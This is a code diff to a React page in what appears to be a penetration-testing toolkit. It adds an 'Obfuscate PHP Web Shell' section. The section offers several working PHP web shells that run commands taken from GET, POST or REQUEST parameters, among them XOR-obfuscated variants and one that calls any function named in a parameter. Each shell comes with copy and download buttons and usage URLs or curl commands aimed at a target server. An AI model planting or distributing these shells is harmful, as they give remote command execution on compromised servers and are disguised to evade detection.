@@ -37,6 +37,13 @@ export default (props) => {
     message.success("Your reverse shell has been copied");
   };
   const oneLiner = `<?php system($_GET["cmd"]);?`;
+  const shell_obfuscate =
+    `<?=$_="";$_="'" \;$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));$_=` +
+    "${$_}['_'^'o'];echo`$_`?>";
+  const shell_obfuscate_function =
+    `<?php $_="{"; $_=($_^"<").($_^">;").($_^"/"); ?>` +
+    "<?=${'_'.$_}['_'](${'_'.$_}['__']);?>";
+
   const phpReverseShell = `
   <?php
   // php-reverse-shell - A Reverse Shell implementation in PHP
@@ -364,6 +371,202 @@ export default (props) => {
             <ArrowsAltOutlined /> See the repo of the author
           </a>
         </Button>
+      </div>
+      <Divider dashed />
+      <div
+        key='d'
+        style={{
+          padding: 15,
+          marginTop: 15,
+        }}
+      >
+        <Title>Obfuscate PHP Web Shell</Title>
+        <Paragraph copyable>{"<?=`$_GET[0]`?>"}</Paragraph>
+        <Paragraph>
+          {" Usage : http://target.com/path/to/shell.php?0=command "}
+        </Paragraph>
+        <Button
+          type='primary'
+          style={{ marginBottom: 10, marginTop: 15 }}
+          onClick={() => {
+            const element = document.createElement("a");
+            const file = new Blob(["<?=`$_GET[0]`?>"], {
+              type: "text/plain",
+            });
+            element.href = URL.createObjectURL(file);
+            element.download = "obfuscateShell.php";
+            document.body.appendChild(element);
+            element.click();
+          }}
+        >
+          <DownloadOutlined /> Download
+        </Button>
+        <Clipboard component='a' data-clipboard-text={"<?=`$_GET[0]`?>"}>
+          <Button
+            type='dashed'
+            style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
+          >
+            <CopyOutlined /> Copy
+          </Button>
+        </Clipboard>
+      </div>
+      <Divider dashed />
+      <div
+        key='e'
+        style={{
+          padding: 15,
+          marginTop: 15,
+        }}
+      >
+        <Paragraph copyable>{"<?=`$_POST[0]`?>"}</Paragraph>
+        <Paragraph>
+          {
+            ' Usage :   curl -X POST http://target.com/path/to/shell.php -d "0=command" '
+          }
+        </Paragraph>
+        <Button
+          type='primary'
+          style={{ marginBottom: 10, marginTop: 15 }}
+          onClick={() => {
+            const element = document.createElement("a");
+            const file = new Blob(["<?=`$_POST[0]`?>"], {
+              type: "text/plain",
+            });
+            element.href = URL.createObjectURL(file);
+            element.download = "obfuscateShell.php";
+            document.body.appendChild(element);
+            element.click();
+          }}
+        >
+          <DownloadOutlined /> Download
+        </Button>
+        <Clipboard component='a' data-clipboard-text={"<?=`$_POST[0]`?>"}>
+          <Button
+            type='dashed'
+            style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
+          >
+            <CopyOutlined /> Copy
+          </Button>
+        </Clipboard>
+      </div>
+      <Divider dashed />
+      <div
+        key='f'
+        style={{
+          padding: 15,
+          marginTop: 15,
+        }}
+      >
+        <Paragraph copyable>{"<?=`{$_REQUEST['_']}`?>"}</Paragraph>
+        <Paragraph>Usage :</Paragraph>
+        <Paragraph>- http://target.com/path/to/shell.php?_=command</Paragraph>
+        <Paragraph>
+          - curl -X POST http://target.com/path/to/shell.php -d "_=command" '
+        </Paragraph>
+        <Button
+          type='primary'
+          style={{ marginBottom: 10, marginTop: 15 }}
+          onClick={() => {
+            const element = document.createElement("a");
+            const file = new Blob(["<?=`{$_REQUEST['_']}`?>"], {
+              type: "text/plain",
+            });
+            element.href = URL.createObjectURL(file);
+            element.download = "obfuscateShell.php";
+            document.body.appendChild(element);
+            element.click();
+          }}
+        >
+          <DownloadOutlined /> Download
+        </Button>
+        <Clipboard
+          component='a'
+          data-clipboard-text={"<?=`{$_REQUEST['_']}`?>"}
+        >
+          <Button
+            type='dashed'
+            style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
+          >
+            <CopyOutlined /> Copy
+          </Button>
+        </Clipboard>
+      </div>
+      <Divider dashed />
+      <div
+        key='f'
+        style={{
+          padding: 15,
+          marginTop: 15,
+        }}
+      >
+        <Paragraph copyable>{shell_obfuscate}</Paragraph>
+        <Paragraph>Usage :</Paragraph>
+        <Paragraph>- http://target.com/path/to/shell.php?0=command</Paragraph>
+        <Button
+          type='primary'
+          style={{ marginBottom: 10, marginTop: 15 }}
+          onClick={() => {
+            const element = document.createElement("a");
+            const file = new Blob([shell_obfuscate], {
+              type: "text/plain",
+            });
+            element.href = URL.createObjectURL(file);
+            element.download = "obfuscateShell.php";
+            document.body.appendChild(element);
+            element.click();
+          }}
+        >
+          <DownloadOutlined /> Download
+        </Button>
+        <Clipboard component='a' data-clipboard-text={shell_obfuscate}>
+          <Button
+            type='dashed'
+            style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
+          >
+            <CopyOutlined /> Copy
+          </Button>
+        </Clipboard>
+      </div>
+      <Divider dashed />
+      <div
+        key='g'
+        style={{
+          padding: 15,
+          marginTop: 15,
+        }}
+      >
+        <Paragraph copyable>{shell_obfuscate_function}</Paragraph>
+        <Paragraph>Usage :</Paragraph>
+        <Paragraph>
+          - http://target.com/path/to/shell.php?_=function&__=argument
+        </Paragraph>
+        <Paragraph>
+          - http://target.com/path/to/shell.php?_=system&__=ls
+        </Paragraph>
+        <Button
+          type='primary'
+          style={{ marginBottom: 10, marginTop: 15 }}
+          onClick={() => {
+            const element = document.createElement("a");
+            const file = new Blob([shell_obfuscate_function], {
+              type: "text/plain",
+            });
+            element.href = URL.createObjectURL(file);
+            element.download = "obfuscateShell.php";
+            document.body.appendChild(element);
+            element.click();
+          }}
+        >
+          <DownloadOutlined /> Download
+        </Button>
+        <Clipboard component='a' data-clipboard-text={shell_obfuscate_function}>
+          <Button
+            type='dashed'
+            style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
+          >
+            <CopyOutlined /> Copy
+          </Button>
+        </Clipboard>
       </div>
     </QueueAnim>
   );
